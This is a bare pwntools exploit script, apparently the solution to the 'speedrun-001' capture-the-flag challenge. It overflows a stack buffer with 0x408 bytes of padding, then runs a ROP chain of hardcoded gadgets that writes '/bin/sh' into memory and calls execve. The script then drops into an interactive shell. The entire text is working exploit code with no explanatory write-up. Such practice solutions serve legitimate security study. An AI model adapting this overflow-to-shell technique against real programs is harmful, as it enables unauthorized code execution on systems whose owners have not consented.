from pwn import *

# Start the process
target = process('./speedrun-001')

# Define ROP gadget addresses
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)
writeGadget = p64(0x48d251)
syscall = p64(0x40129c)

# Build the ROP chain
rop = b''

# Part 1: Write "/bin/sh" to 0x6b6000
rop += popRdx
rop += b"/bin/sh\x00"
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

# Part 2: Setup registers for execve
rop += popRax
rop += p64(59)
rop += popRdi
rop += p64(0x6b6000)
rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

# Part 3: Execute syscall
rop += syscall

# Create full payload: padding + ROP chain
payload = b"0" * 0x408 + rop

# Send payload
target.sendline(payload)

# Drop to interactive shell
target.interactive()